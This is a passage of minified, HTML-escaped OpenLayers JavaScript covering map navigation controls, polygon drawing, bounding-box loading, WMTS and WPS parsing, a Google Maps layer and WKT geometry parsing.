"border-top-width")),e=parseInt(OpenLayers.Element.getStyle(this.zoomBox,"border-bottom-width"));this.boxOffsets={left:a,right:c,top:d,bottom:e,width:!1===b?a+c:0,height:!1===b?d+e:0}}return this.boxOffsets},CLASS_NAME:"OpenLayers.Handler.Box"});OpenLayers.Control.ZoomBox=OpenLayers.Class(OpenLayers.Control,{type:OpenLayers.Control.TYPE_TOOL,out:!1,keyMask:null,alwaysZoom:!1,zoomOnClick:!0,draw:function(){this.handler=new OpenLayers.Handler.Box(this,{done:this.zoomBox},{keyMask:this.keyMask})},zoomBox:function(a){if(a instanceof OpenLayers.Bounds){var b,c=a.getCenterPixel();if(this.out){b=Math.min(this.map.size.h/(a.bottom-a.top),this.map.size.w/(a.right-a.left));var d=this.map.getExtent(),e=this.map.getLonLatFromPixel(c),f=e.lon-d.getWidth()/ 2*b;a=e.lon+d.getWidth()/2*b;var g=e.lat-d.getHeight()/2*b;b=e.lat+d.getHeight()/2*b;b=new OpenLayers.Bounds(f,g,a,b)}else f=this.map.getLonLatFromPixel({x:a.left,y:a.bottom}),a=this.map.getLonLatFromPixel({x:a.right,y:a.top}),b=new OpenLayers.Bounds(f.lon,f.lat,a.lon,a.lat);f=this.map.getZoom();g=this.map.getSize();a=g.w/2;g=g.h/2;b=this.map.getZoomForExtent(b);d=this.map.getResolution();e=this.map.getResolutionForZoom(b);d==e?this.map.setCenter(this.map.getLonLatFromPixel(c)):this.map.zoomTo(b, {x:(d*c.x-e*a)/(d-e),y:(d*c.y-e*g)/(d-e)});f==this.map.getZoom()&amp;&amp;!0==this.alwaysZoom&amp;&amp;this.map.zoomTo(f+(this.out?-1:1))}else this.zoomOnClick&amp;&amp;(this.out?this.map.zoomTo(this.map.getZoom()-1,a):this.map.zoomTo(this.map.getZoom()+1,a))},CLASS_NAME:"OpenLayers.Control.ZoomBox"});OpenLayers.Control.DragPan=OpenLayers.Class(OpenLayers.Control,{type:OpenLayers.Control.TYPE_TOOL,panned:!1,interval:0,documentDrag:!1,kinetic:null,enableKinetic:!0,kineticInterval:10,draw:function(){if(this.enableKinetic&amp;&amp;OpenLayers.Kinetic){var a={interval:this.kineticInterval};"object"===typeof this.enableKinetic&amp;&amp;(a=OpenLayers.Util.extend(a,this.enableKinetic));this.kinetic=new OpenLayers.Kinetic(a)}this.handler=new OpenLayers.Handler.Drag(this,{move:this.panMap,done:this.panMapDone,down:this.panMapStart}, {interval:this.interval,documentDrag:this.documentDrag})},panMapStart:function(){this.kinetic&amp;&amp;this.kinetic.begin()},panMap:function(a){this.kinetic&amp;&amp;this.kinetic.update(a);this.panned=!0;this.map.pan(this.handler.last.x-a.x,this.handler.last.y-a.y,{dragging:!0,animate:!1})},panMapDone:function(a){if(this.panned){var b=null;this.kinetic&amp;&amp;(b=this.kinetic.end(a));this.map.pan(this.handler.last.x-a.x,this.handler.last.y-a.y,{dragging:!!b,animate:!1});if(b){var c=this;this.kinetic.move(b,function(a,b, f){c.map.pan(a,b,{dragging:!f,animate:!1})})}this.panned=!1}},CLASS_NAME:"OpenLayers.Control.DragPan"});OpenLayers.Control.Navigation=OpenLayers.Class(OpenLayers.Control,{dragPan:null,dragPanOptions:null,pinchZoom:null,pinchZoomOptions:null,documentDrag:!1,zoomBox:null,zoomBoxEnabled:!0,zoomWheelEnabled:!0,mouseWheelOptions:null,handleRightClicks:!1,zoomBoxKeyMask:OpenLayers.Handler.MOD_SHIFT,autoActivate:!0,initialize:function(a){this.handlers={};OpenLayers.Control.prototype.initialize.apply(this,arguments)},destroy:function(){this.deactivate();this.dragPan&amp;&amp;this.dragPan.destroy();this.dragPan=null; this.zoomBox&amp;&amp;this.zoomBox.destroy();this.zoomBox=null;this.pinchZoom&amp;&amp;this.pinchZoom.destroy();this.pinchZoom=null;OpenLayers.Control.prototype.destroy.apply(this,arguments)},activate:function(){this.dragPan.activate();this.zoomWheelEnabled&amp;&amp;this.handlers.wheel.activate();this.handlers.click.activate();this.zoomBoxEnabled&amp;&amp;this.zoomBox.activate();this.pinchZoom&amp;&amp;this.pinchZoom.activate();return OpenLayers.Control.prototype.activate.apply(this,arguments)},deactivate:function(){this.pinchZoom&amp;&amp;this.pinchZoom.deactivate(); this.zoomBox.deactivate();this.dragPan.deactivate();this.handlers.click.deactivate();this.handlers.wheel.deactivate();return OpenLayers.Control.prototype.deactivate.apply(this,arguments)},draw:function(){this.handleRightClicks&amp;&amp;(this.map.viewPortDiv.oncontextmenu=OpenLayers.Function.False);this.handlers.click=new OpenLayers.Handler.Click(this,{click:this.defaultClick,dblclick:this.defaultDblClick,dblrightclick:this.defaultDblRightClick},{"double":!0,stopDouble:!0});this.dragPan=new OpenLayers.Control.DragPan(OpenLayers.Util.extend({map:this.map, documentDrag:this.documentDrag},this.dragPanOptions));this.zoomBox=new OpenLayers.Control.ZoomBox({map:this.map,keyMask:this.zoomBoxKeyMask});this.dragPan.draw();this.zoomBox.draw();this.handlers.wheel=new OpenLayers.Handler.MouseWheel(this,{up:this.wheelUp,down:this.wheelDown},OpenLayers.Util.extend(this.map.fractionalZoom?{}:{cumulative:!1,interval:50,maxDelta:6},this.mouseWheelOptions));OpenLayers.Control.PinchZoom&amp;&amp;(this.pinchZoom=new OpenLayers.Control.PinchZoom(OpenLayers.Util.extend({map:this.map}, this.pinchZoomOptions)))},defaultClick:function(a){a.lastTouches&amp;&amp;2==a.lastTouches.length&amp;&amp;this.map.zoomOut()},defaultDblClick:function(a){this.map.zoomTo(this.map.zoom+1,a.xy)},defaultDblRightClick:function(a){this.map.zoomTo(this.map.zoom-1,a.xy)},wheelChange:function(a,b){this.map.fractionalZoom||(b=Math.round(b));var c=this.map.getZoom(),d;d=Math.max(c+b,0);d=Math.min(d,this.map.getNumZoomLevels());d!==c&amp;&amp;this.map.zoomTo(d,a.xy)},wheelUp:function(a,b){this.wheelChange(a,b||1)},wheelDown:function(a, b){this.wheelChange(a,b||-1)},disableZoomBox:function(){this.zoomBoxEnabled=!1;this.zoomBox.deactivate()},enableZoomBox:function(){this.zoomBoxEnabled=!0;this.active&amp;&amp;this.zoomBox.activate()},disableZoomWheel:function(){this.zoomWheelEnabled=!1;this.handlers.wheel.deactivate()},enableZoomWheel:function(){this.zoomWheelEnabled=!0;this.active&amp;&amp;this.handlers.wheel.activate()},CLASS_NAME:"OpenLayers.Control.Navigation"});OpenLayers.Control.DrawFeature=OpenLayers.Class(OpenLayers.Control,{layer:null,callbacks:null,multi:!1,featureAdded:function(){},initialize:function(a,b,c){OpenLayers.Control.prototype.initialize.apply(this,[c]);this.callbacks=OpenLayers.Util.extend({done:this.drawFeature,modify:function(a,b){this.layer.events.triggerEvent("sketchmodified",{vertex:a,feature:b})},create:function(a,b){this.layer.events.triggerEvent("sketchstarted",{vertex:a,feature:b})}},this.callbacks);this.layer=a;this.handlerOptions= this.handlerOptions||{};this.handlerOptions.layerOptions=OpenLayers.Util.applyDefaults(this.handlerOptions.layerOptions,{renderers:a.renderers,rendererOptions:a.rendererOptions});"multi"in this.handlerOptions||(this.handlerOptions.multi=this.multi);if(a=this.layer.styleMap&amp;&amp;this.layer.styleMap.styles.temporary)this.handlerOptions.layerOptions=OpenLayers.Util.applyDefaults(this.handlerOptions.layerOptions,{styleMap:new OpenLayers.StyleMap({"default":a})});this.handler=new b(this,this.callbacks,this.handlerOptions)}, drawFeature:function(a){a=new OpenLayers.Feature.Vector(a);!1!==this.layer.events.triggerEvent("sketchcomplete",{feature:a})&amp;&amp;(a.state=OpenLayers.State.INSERT,this.layer.addFeatures([a]),this.featureAdded(a),this.events.triggerEvent("featureadded",{feature:a}))},insertXY:function(a,b){this.handler&amp;&amp;this.handler.line&amp;&amp;this.handler.insertXY(a,b)},insertDeltaXY:function(a,b){this.handler&amp;&amp;this.handler.line&amp;&amp;this.handler.insertDeltaXY(a,b)},insertDirectionLength:function(a,b){this.handler&amp;&amp;this.handler.line&amp;&amp; this.handler.insertDirectionLength(a,b)},insertDeflectionLength:function(a,b){this.handler&amp;&amp;this.handler.line&amp;&amp;this.handler.insertDeflectionLength(a,b)},undo:function(){return this.handler.undo&amp;&amp;this.handler.undo()},redo:function(){return this.handler.redo&amp;&amp;this.handler.redo()},finishSketch:function(){this.handler.finishGeometry()},cancel:function(){this.handler.cancel()},CLASS_NAME:"OpenLayers.Control.DrawFeature"});OpenLayers.Handler.Polygon=OpenLayers.Class(OpenLayers.Handler.Path,{holeModifier:null,drawingHole:!1,polygon:null,createFeature:function(a){a=this.layer.getLonLatFromViewPortPx(a);a=new OpenLayers.Geometry.Point(a.lon,a.lat);this.point=new OpenLayers.Feature.Vector(a);this.line=new OpenLayers.Feature.Vector(new OpenLayers.Geometry.LinearRing([this.point.geometry]));this.polygon=new OpenLayers.Feature.Vector(new OpenLayers.Geometry.Polygon([this.line.geometry]));this.callback("create",[this.point.geometry, this.getSketch()]);this.point.geometry.clearBounds();this.layer.addFeatures([this.polygon,this.point],{silent:!0})},addPoint:function(a){if(!this.drawingHole&amp;&amp;this.holeModifier&amp;&amp;this.evt&amp;&amp;this.evt[this.holeModifier])for(var b=this.point.geometry,c=this.control.layer.features,d,e=c.length-1;0&lt;=e;--e)if(d=c[e].geometry,(d instanceof OpenLayers.Geometry.Polygon||d instanceof OpenLayers.Geometry.MultiPolygon)&amp;&amp;d.intersects(b)){b=c[e];this.control.layer.removeFeatures([b],{silent:!0});this.control.layer.events.registerPriority("sketchcomplete", this,this.finalizeInteriorRing);this.control.layer.events.registerPriority("sketchmodified",this,this.enforceTopology);b.geometry.addComponent(this.line.geometry);this.polygon=b;this.drawingHole=!0;break}OpenLayers.Handler.Path.prototype.addPoint.apply(this,arguments)},getCurrentPointIndex:function(){return this.line.geometry.components.length-2},enforceTopology:function(a){a=a.vertex;var b=this.line.geometry.components;this.polygon.geometry.intersects(a)||(b=b[b.length-3],a.x=b.x,a.y=b.y)},finishGeometry:function(){this.line.geometry.removeComponent(this.line.geometry.components[this.line.geometry.components.length- 2]);this.removePoint();this.finalize()},finalizeInteriorRing:function(){var a=this.line.geometry,b=0!==a.getArea();if(b){for(var c=this.polygon.geometry.components,d=c.length-2;0&lt;=d;--d)if(a.intersects(c[d])){b=!1;break}if(b)a:for(d=c.length-2;0&lt;d;--d)for(var e=c[d].components,f=0,g=e.length;f&lt;g;++f)if(a.containsPoint(e[f])){b=!1;break a}}b?this.polygon.state!==OpenLayers.State.INSERT&amp;&amp;(this.polygon.state=OpenLayers.State.UPDATE):this.polygon.geometry.removeComponent(a);this.restoreFeature();return!1}, cancel:function(){this.drawingHole&amp;&amp;(this.polygon.geometry.removeComponent(this.line.geometry),this.restoreFeature(!0));return OpenLayers.Handler.Path.prototype.cancel.apply(this,arguments)},restoreFeature:function(a){this.control.layer.events.unregister("sketchcomplete",this,this.finalizeInteriorRing);this.control.layer.events.unregister("sketchmodified",this,this.enforceTopology);this.layer.removeFeatures([this.polygon],{silent:!0});this.control.layer.addFeatures([this.polygon],{silent:!0});this.drawingHole= !1;a||this.control.layer.events.triggerEvent("sketchcomplete",{feature:this.polygon})},destroyFeature:function(a){OpenLayers.Handler.Path.prototype.destroyFeature.call(this,a);this.polygon=null},drawFeature:function(){this.layer.drawFeature(this.polygon,this.style);this.layer.drawFeature(this.point,this.style)},getSketch:function(){return this.polygon},getGeometry:function(){var a=this.polygon&amp;&amp;this.polygon.geometry;a&amp;&amp;this.multi&amp;&amp;(a=new OpenLayers.Geometry.MultiPolygon([a]));return a},CLASS_NAME:"OpenLayers.Handler.Polygon"});OpenLayers.Control.EditingToolbar=OpenLayers.Class(OpenLayers.Control.Panel,{citeCompliant:!1,initialize:function(a,b){OpenLayers.Control.Panel.prototype.initialize.apply(this,[b]);this.addControls([new OpenLayers.Control.Navigation]);var c=[new OpenLayers.Control.DrawFeature(a,OpenLayers.Handler.Point,{displayClass:"olControlDrawFeaturePoint",handlerOptions:{citeCompliant:this.citeCompliant}}),new OpenLayers.Control.DrawFeature(a,OpenLayers.Handler.Path,{displayClass:"olControlDrawFeaturePath",handlerOptions:{citeCompliant:this.citeCompliant}}), new OpenLayers.Control.DrawFeature(a,OpenLayers.Handler.Polygon,{displayClass:"olControlDrawFeaturePolygon",handlerOptions:{citeCompliant:this.citeCompliant}})];this.addControls(c)},draw:function(){var a=OpenLayers.Control.Panel.prototype.draw.apply(this,arguments);null===this.defaultControl&amp;&amp;(this.defaultControl=this.controls[0]);return a},CLASS_NAME:"OpenLayers.Control.EditingToolbar"});OpenLayers.Strategy.BBOX=OpenLayers.Class(OpenLayers.Strategy,{bounds:null,resolution:null,ratio:2,resFactor:null,response:null,activate:function(){var a=OpenLayers.Strategy.prototype.activate.call(this);a&amp;&amp;(this.layer.events.on({moveend:this.update,refresh:this.update,visibilitychanged:this.update,scope:this}),this.update());return a},deactivate:function(){var a=OpenLayers.Strategy.prototype.deactivate.call(this);a&amp;&amp;this.layer.events.un({moveend:this.update,refresh:this.update,visibilitychanged:this.update, scope:this});return a},update:function(a){var b=this.getMapBounds();null!==b&amp;&amp;(a&amp;&amp;a.force||this.layer.visibility&amp;&amp;this.layer.calculateInRange()&amp;&amp;this.invalidBounds(b))&amp;&amp;(this.calculateBounds(b),this.resolution=this.layer.map.getResolution(),this.triggerRead(a))},getMapBounds:function(){if(null===this.layer.map)return null;var a=this.layer.map.getExtent();a&amp;&amp;!this.layer.projection.equals(this.layer.map.getProjectionObject())&amp;&amp;(a=a.clone().transform(this.layer.map.getProjectionObject(),this.layer.projection)); return a},invalidBounds:function(a){a||(a=this.getMapBounds());a=!this.bounds||!this.bounds.containsBounds(a);!a&amp;&amp;this.resFactor&amp;&amp;(a=this.resolution/this.layer.map.getResolution(),a=a>=this.resFactor||a&lt;=1/this.resFactor);return a},calculateBounds:function(a){a||(a=this.getMapBounds());var b=a.getCenterLonLat(),c=a.getWidth()*this.ratio;a=a.getHeight()*this.ratio;this.bounds=new OpenLayers.Bounds(b.lon-c/2,b.lat-a/2,b.lon+c/2,b.lat+a/2)},triggerRead:function(a){!this.response||a&amp;&amp;!0===a.noAbort|| (this.layer.protocol.abort(this.response),this.layer.events.triggerEvent("loadend"));var b={filter:this.createFilter()};this.layer.events.triggerEvent("loadstart",b);this.response=this.layer.protocol.read(OpenLayers.Util.applyDefaults({filter:b.filter,callback:this.merge,scope:this},a))},createFilter:function(){var a=new OpenLayers.Filter.Spatial({type:OpenLayers.Filter.Spatial.BBOX,value:this.bounds,projection:this.layer.projection});this.layer.filter&amp;&amp;(a=new OpenLayers.Filter.Logical({type:OpenLayers.Filter.Logical.AND, filters:[this.layer.filter,a]}));return a},merge:function(a){this.layer.destroyFeatures();if(a.success()){var b=a.features;if(b&amp;&amp;0&lt;b.length){var c=this.layer.projection,d=this.layer.map.getProjectionObject();if(!d.equals(c))for(var e,f=0,g=b.length;f&lt;g;++f)(e=b[f].geometry)&amp;&amp;e.transform(c,d);this.layer.addFeatures(b)}}else this.bounds=null;this.response=null;this.layer.events.triggerEvent("loadend",{response:a})},CLASS_NAME:"OpenLayers.Strategy.BBOX"});OpenLayers.Layer.WorldWind=OpenLayers.Class(OpenLayers.Layer.Grid,{DEFAULT_PARAMS:{},isBaseLayer:!0,lzd:null,zoomLevels:null,initialize:function(a,b,c,d,e,f){this.lzd=c;this.zoomLevels=d;c=[];c.push(a,b,e,f);OpenLayers.Layer.Grid.prototype.initialize.apply(this,c);this.params=OpenLayers.Util.applyDefaults(this.params,this.DEFAULT_PARAMS)},getZoom:function(){var a=this.map.getZoom();this.map.getMaxExtent();return a-=Math.log(this.maxResolution/(this.lzd/512))/Math.log(2)},getURL:function(a){a=this.adjustBounds(a); var b=this.getZoom(),c=this.map.getMaxExtent(),d=this.lzd/Math.pow(2,this.getZoom()),e=Math.floor((a.left-c.left)/d);a=Math.floor((a.bottom-c.bottom)/d);return this.map.getResolution()&lt;=this.lzd/512&amp;&amp;this.getZoom()&lt;=this.zoomLevels?this.getFullRequestString({L:b,X:e,Y:a}):OpenLayers.Util.getImageLocation("blank.gif")},CLASS_NAME:"OpenLayers.Layer.WorldWind"});OpenLayers.Protocol.CSW=function(a){a=OpenLayers.Util.applyDefaults(a,OpenLayers.Protocol.CSW.DEFAULTS);var b=OpenLayers.Protocol.CSW["v"+a.version.replace(/\./g,"_")];if(!b)throw"Unsupported CSW version: "+a.version;return new b(a)};OpenLayers.Protocol.CSW.DEFAULTS={version:"2.0.2"};OpenLayers.Format.WMTSCapabilities=OpenLayers.Class(OpenLayers.Format.XML.VersionedOGC,{defaultVersion:"1.0.0",yx:{"urn:ogc:def:crs:EPSG::4326":!0},createLayer:function(a,b){if(!("layer"in b))throw Error("Missing property 'layer' in configuration.");for(var c=a.contents,d,e=0,f=c.layers.length;e&lt;f;++e)if(c.layers[e].identifier===b.layer){d=c.layers[e];break}if(!d)throw Error("Layer not found");var g=b.format;!g&amp;&amp;(d.formats&amp;&amp;d.formats.length)&amp;&amp;(g=d.formats[0]);var h;b.matrixSet?h=c.tileMatrixSets[b.matrixSet]: 1&lt;=d.tileMatrixSetLinks.length&amp;&amp;(h=c.tileMatrixSets[d.tileMatrixSetLinks[0].tileMatrixSet]);if(!h)throw Error("matrixSet not found");for(var k,e=0,f=d.styles.length;e&lt;f&amp;&amp;(k=d.styles[e],!k.isDefault);++e);c=b.requestEncoding;if(!c&amp;&amp;(c="KVP",a.operationsMetadata.GetTile.dcp.http)){var l=a.operationsMetadata.GetTile.dcp.http;l.get[0].constraints&amp;&amp;(l=l.get[0].constraints.GetEncoding.allowedValues,l.KVP||!l.REST&amp;&amp;!l.RESTful||(c="REST"))}var l=[],m=b.params||{};delete b.params;for(var n=0,p=d.dimensions.length;n&lt; p;n++){var q=d.dimensions[n];l.push(q.identifier);m.hasOwnProperty(q.identifier)||(m[q.identifier]=q["default"])}var n=b.projection||h.supportedCRS.replace(/urn:ogc:def:crs:(\w+):(.*:)?(\w+)$/,"$1:$3"),p=b.units||("EPSG:4326"===n?"degrees":"m"),q=[],r;for(r in h.matrixIds)h.matrixIds.hasOwnProperty(r)&amp;&amp;q.push(2.8E-4*h.matrixIds[r].scaleDenominator/OpenLayers.METERS_PER_INCH/OpenLayers.INCHES_PER_UNIT[p]);if("REST"===c&amp;&amp;d.resourceUrls){r=[];for(var f=0,s=d.resourceUrls.length;f&lt;s;++f)e=d.resourceUrls[f], e.format===g&amp;&amp;"tile"===e.resourceType&amp;&amp;r.push(e.template)}else{s=a.operationsMetadata.GetTile.dcp.http.get;r=[];for(var t,e=0,f=s.length;e&lt;f;e++)t=s[e].constraints,(!t||t&amp;&amp;t.GetEncoding.allowedValues[c])&amp;&amp;r.push(s[e].url)}return new OpenLayers.Layer.WMTS(OpenLayers.Util.applyDefaults(b,{url:r,requestEncoding:c,name:d.title,style:k.identifier,format:g,matrixIds:h.matrixIds,matrixSet:h.identifier,projection:n,units:p,resolutions:!1===b.isBaseLayer?void 0:q,serverResolutions:q,tileFullExtent:h.bounds, dimensions:l,params:m}))},CLASS_NAME:"OpenLayers.Format.WMTSCapabilities"});OpenLayers.Layer.Google.v3={DEFAULTS:{sphericalMercator:!0,projection:"EPSG:900913"},animationEnabled:!0,loadMapObject:function(){this.type||(this.type=google.maps.MapTypeId.ROADMAP);var a,b=OpenLayers.Layer.Google.cache[this.map.id];b?(a=b.mapObject,++b.count):(a=this.map.getCenter(),b=document.createElement("div"),b.className="olForeignContainer",b.style.width="100%",b.style.height="100%",a=new google.maps.Map(b,{center:a?new google.maps.LatLng(a.lat,a.lon):new google.maps.LatLng(0,0),zoom:this.map.getZoom()|| 0,mapTypeId:this.type,disableDefaultUI:!0,keyboardShortcuts:!1,draggable:!1,disableDoubleClickZoom:!0,scrollwheel:!1,streetViewControl:!1}),b=document.createElement("div"),b.style.width="100%",b.style.height="100%",a.controls[google.maps.ControlPosition.TOP_LEFT].push(b),b={googleControl:b,mapObject:a,count:1},OpenLayers.Layer.Google.cache[this.map.id]=b);this.mapObject=a;this.setGMapVisibility(this.visibility)},onMapResize:function(){this.visibility&amp;&amp;google.maps.event.trigger(this.mapObject,"resize")}, setGMapVisibility:function(a){var b=OpenLayers.Layer.Google.cache[this.map.id],c=this.map;if(b){for(var d=this.type,e=c.layers,f,g=e.length-1;0&lt;=g;--g)if(f=e[g],f instanceof OpenLayers.Layer.Google&amp;&amp;!0===f.visibility&amp;&amp;!0===f.inRange){d=f.type;a=!0;break}e=this.mapObject.getDiv();if(!0===a){if(e.parentNode!==c.div)if(b.rendered)c.div.appendChild(e),b.googleControl.appendChild(c.viewPortDiv),google.maps.event.trigger(this.mapObject,"resize");else{var h=this;google.maps.event.addListenerOnce(this.mapObject, "tilesloaded",function(){b.rendered=!0;h.setGMapVisibility(h.getVisibility());h.moveTo(h.map.getCenter())})}this.mapObject.setMapTypeId(d)}else b.googleControl.hasChildNodes()&amp;&amp;(c.div.appendChild(c.viewPortDiv),c.div.removeChild(e))}},getMapContainer:function(){return this.mapObject.getDiv()},getMapObjectBoundsFromOLBounds:function(a){var b=null;null!=a&amp;&amp;(b=this.sphericalMercator?this.inverseMercator(a.bottom,a.left):new OpenLayers.LonLat(a.bottom,a.left),a=this.sphericalMercator?this.inverseMercator(a.top, a.right):new OpenLayers.LonLat(a.top,a.right),b=new google.maps.LatLngBounds(new google.maps.LatLng(b.lat,b.lon),new google.maps.LatLng(a.lat,a.lon)));return b},getMapObjectLonLatFromMapObjectPixel:function(a){var b=this.map.getSize(),c=this.getLongitudeFromMapObjectLonLat(this.mapObject.center),d=this.getLatitudeFromMapObjectLonLat(this.mapObject.center),e=this.map.getResolution();a=new OpenLayers.LonLat(c+(a.x-b.w/2)*e,d-(a.y-b.h/2)*e);this.wrapDateLine&amp;&amp;(a=a.wrapDateLine(this.maxExtent));return this.getMapObjectLonLatFromLonLat(a.lon, a.lat)},getMapObjectPixelFromMapObjectLonLat:function(a){var b=this.getLongitudeFromMapObjectLonLat(a);a=this.getLatitudeFromMapObjectLonLat(a);var c=this.map.getResolution(),d=this.map.getExtent();return this.getMapObjectPixelFromXY(1/c*(b-d.left),1/c*(d.top-a))},setMapObjectCenter:function(a,b){if(!1===this.animationEnabled&amp;&amp;b!=this.mapObject.zoom){var c=this.getMapContainer();google.maps.event.addListenerOnce(this.mapObject,"idle",function(){c.style.visibility=""});c.style.visibility="hidden"}this.mapObject.setOptions({center:a, zoom:b})},getMapObjectZoomFromMapObjectBounds:function(a){return this.mapObject.getBoundsZoomLevel(a)},getMapObjectLonLatFromLonLat:function(a,b){var c;this.sphericalMercator?(c=this.inverseMercator(a,b),c=new google.maps.LatLng(c.lat,c.lon)):c=new google.maps.LatLng(b,a);return c},getMapObjectPixelFromXY:function(a,b){return new google.maps.Point(a,b)}};OpenLayers.Format.WPSDescribeProcess=OpenLayers.Class(OpenLayers.Format.XML,{VERSION:"1.0.0",namespaces:{wps:"http://www.opengis.net/wps/1.0.0",ows:"http://www.opengis.net/ows/1.1",xsi:"http://www.w3.org/2001/XMLSchema-instance"},schemaLocation:"http://www.opengis.net/wps/1.0.0 http://schemas.opengis.net/wps/1.0.0/wpsAll.xsd",defaultPrefix:"wps",regExes:{trimSpace:/^\s*|\s*$/g,removeSpace:/\s*/g,splitSpace:/\s+/,trimComma:/\s*,\s*/g},read:function(a){"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this, [a]));a&amp;&amp;9==a.nodeType&amp;&amp;(a=a.documentElement);var b={};this.readNode(a,b);return b},readers:{wps:{ProcessDescriptions:function(a,b){b.processDescriptions={};this.readChildNodes(a,b.processDescriptions)},ProcessDescription:function(a,b){var c={processVersion:this.getAttributeNS(a,this.namespaces.wps,"processVersion"),statusSupported:"true"===a.getAttribute("statusSupported"),storeSupported:"true"===a.getAttribute("storeSupported")};this.readChildNodes(a,c);b[c.identifier]=c},DataInputs:function(a, b){b.dataInputs=[];this.readChildNodes(a,b.dataInputs)},ProcessOutputs:function(a,b){b.processOutputs=[];this.readChildNodes(a,b.processOutputs)},Output:function(a,b){var c={};this.readChildNodes(a,c);b.push(c)},ComplexOutput:function(a,b){b.complexOutput={};this.readChildNodes(a,b.complexOutput)},LiteralOutput:function(a,b){b.literalOutput={};this.readChildNodes(a,b.literalOutput)},Input:function(a,b){var c={maxOccurs:parseInt(a.getAttribute("maxOccurs")),minOccurs:parseInt(a.getAttribute("minOccurs"))}; this.readChildNodes(a,c);b.push(c)},BoundingBoxData:function(a,b){b.boundingBoxData={};this.readChildNodes(a,b.boundingBoxData)},CRS:function(a,b){b.CRSs||(b.CRSs={});b.CRSs[this.getChildValue(a)]=!0},LiteralData:function(a,b){b.literalData={};this.readChildNodes(a,b.literalData)},ComplexData:function(a,b){b.complexData={};this.readChildNodes(a,b.complexData)},Default:function(a,b){b["default"]={};this.readChildNodes(a,b["default"])},Supported:function(a,b){b.supported={};this.readChildNodes(a,b.supported)}, Format:function(a,b){var c={};this.readChildNodes(a,c);b.formats||(b.formats={});b.formats[c.mimeType]=!0},MimeType:function(a,b){b.mimeType=this.getChildValue(a)}},ows:OpenLayers.Format.OWSCommon.v1_1_0.prototype.readers.ows},CLASS_NAME:"OpenLayers.Format.WPSDescribeProcess"});OpenLayers.Format.WKT=OpenLayers.Class(OpenLayers.Format,{initialize:function(a){this.regExes={typeStr:/^\s*(\w+)\s*\(\s*(.*)\s*\)\s*$/,spaces:/\s+/,parenComma:/\)\s*,\s*\(/,doubleParenComma:/\)\s*\)\s*,\s*\(\s*\(/,trimParens:/^\s*\(?(.*?)\)?\s*$/};OpenLayers.Format.prototype.initialize.apply(this,[a])},read:function(a){var b,c;a=a.replace(/[\n\r]/g," ");if(c=this.regExes.typeStr.exec(a))if(a=c[1].toLowerCase(),c=c[2],this.parse[a]&amp;&amp;(b=this.parse[a].apply(this,[c])),this.internalProjection&amp;&amp;this.externalProjection)if(b&amp;&amp; "OpenLayers.Feature.Vector"==b.CLASS_NAME)b.geometry.transform(this.externalProjection,this.internalProjection);else if(b&amp;&amp;"geometrycollection"!=a&amp;&amp;"object"==typeof b)for(a=0,c=b.length;a&lt;c;a++)b[a].geometry.transform(this.externalProjection,this.internalProjection);return b},write:function(a){var b,c;a.constructor==Array?c=!0:(a=[a],c=!1);var d=[];c&amp;&amp;d.push("GEOMETRYCOLLECTION(");for(var e=0,f=a.length;e&lt;f;++e)c&amp;&amp;0&lt;e&amp;&amp;d.push(","),b=a[e].geometry,d.push(this.extractGeometry(b));c&amp;&amp;d.push(")");return d.join("")}, extractGeometry:function(a){var b=a.CLASS_NAME.split(".")[2].toLowerCase();if(!this.extract[b])return null;this.internalProjection&amp;&amp;this.externalProjection&amp;&amp;(a=a.clone(),a.transform(this.internalProjection,this.externalProjection));return("collection"==b?"GEOMETRYCOLLECTION":b.toUpperCase())+"("+this.extract[b].apply(this,[a])+")"},extract:{point:function(a){return a.x+" "+a.y},multipoint:function(a){for(var b=[],c=0,d=a.components.length;c&lt;d;++c)b.push("("+this.extract.point.apply(this,[a.components[c]])+ ")");return b.join(",")},linestring:function(a){for(var b=[],c=0,d=a.components.length;c&lt;d;++c)b.push(this.extract.point.apply(this,[a.components[c]]));return b.join(",")},multilinestring:function(a){for(var b=[],c=0,d=a.components.length;c&lt;d;++c)b.push("("+this.extract.linestring.apply(this,[a.components[c]])+")");return b.join(",")},polygon:function(a){for(var b=[],c=0,d=a.components.length;c&lt;d;++c)b.push("("+this.extract.linestring.apply(this,[a.components[c]])+")");return b.join(",")},multipolygon:function(a){for(var b= [],c=0,d=a.components.length;c&lt;d;++c)b.push("("+this.extract.polygon.apply(this,[a.components[c]])+")");return b.join(",")},collection:function(a){for(var b=[],c=0,d=a.components.length;c&lt;d;++c)b.push(this.extractGeometry.apply(this,[a.components[c]]));return b.join(",")}},parse:{point:function(a){a=OpenLayers.String.trim(a).split(this.regExes.spaces);return new OpenLayers.Feature.Vector(new OpenLayers.Geometry.Point(a[0],a[1]))},multipoint:function(a){for(var b=OpenLayers.String.trim(a).split(","), c=[],d=0,e=b.length;d&lt;e;++d)a=b[d].replace(this.regExes.trimParens,"$1"),c.push(this.parse.point.apply(this,[a]).geometry);return new OpenLayers.Feature.Vector(new OpenLayers.Geometry.MultiPoint(c))},linestring:function(a){a=OpenLayers.String.trim(a).split(",");for(var b=[],c=0,d=a.length;c&lt;d;++c)b.push(this.parse.point.apply(this,[a[c]]).geometry);return new OpenLayers.Feature.Vector(new OpenLayers.Geometry.LineString(b))},multilinestring:function(a){for(var b=OpenLayers.String.trim(a).split(this.regExes.parenComma), c=[],d=0,e=b.length;d&lt;e;++d)a=b[d].replace(this.regExes.trimParens,"$1"),c.push(this.parse.linestring.apply(this,[a]).geometry);return new OpenLayers.Feature.Vector(new OpenLayers.Geometry.MultiLineString(c))},polygon:function(a){var b;a=OpenLayers.String.trim(a).split(this.regExes.parenComma);for(var c=[],d=0,e=a.length;d&lt;e;++d)b=a[d].replace(this.regExes.trimParens,"$1"),b=this.parse.linestring.apply(this,[b]).geometry,b=new OpenLayers.Geometry.LinearRing(b.components),c.push(b);return new OpenLayers.Feature.Vector(new OpenLayers.Geometry.Polygon(c))}, multipolygon:function(a){for(var b=OpenLayers.String.trim(a).split(this.regExes.doubleParenComma),c=[],d=0,e=b.length;d&lt;e;++d)a=b[d].replace(this.regExes.trimParens,"$1"),c.push(this.parse.polygon.apply(this,[a]).geometry);return new OpenLayers.Feature.Vector(new OpenLayers.Geometry.MultiPolygon(c))},geometrycollection:function(a){a=a.replace(/,\s*([A-Za-z])/g,"|$1");a=OpenLayers.String.trim(a).split("|");for(var b=[],c=0,d=a.length;c&lt;d;++c)b.push(OpenLayers.Format.WKT.prototype.read.apply(this,[a[c]])); return 